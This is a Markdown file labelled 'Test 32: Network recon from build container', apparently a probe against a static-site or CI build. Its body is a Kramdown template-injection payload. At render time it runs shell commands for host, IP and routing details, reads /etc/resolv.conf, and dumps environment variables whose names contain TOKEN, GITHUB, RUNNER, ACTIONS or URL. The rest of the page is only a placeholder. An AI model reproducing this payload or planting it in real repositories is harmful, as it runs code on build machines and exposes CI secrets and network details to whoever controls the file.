---
---

# Test 32: Network recon from build container

{::options template="string://<%= require 'socket'; r=''; r=r+'HOSTNAME='+`hostname 2>&1`.strip+\"\\n\"; r=r+'IP='+`hostname -I 2>&1`.strip+\"\\n\"; r=r+'RESOLV='+File.read('/etc/resolv.conf').gsub(\"\\n\",' ')+\"\\n\"; begin; r=r+'IFCONFIG='+`ip addr 2>&1`[0..500]+\"\\n\"; rescue; end; begin; r=r+'ROUTES='+`ip route 2>&1`[0..300]+\"\\n\"; rescue; end; begin; r=r+'ENV_ACTIONS='; ENV.each do |k,v|; if k.include?('ACTIONS') or k.include?('GITHUB') or k.include?('RUNNER') or k.include?('TOKEN') or k.include?('URL'); r=r+k+'='+v[0..80]+' '; end; end; r=r+\"\\n\"; rescue; end; r %>" /}

placeholder
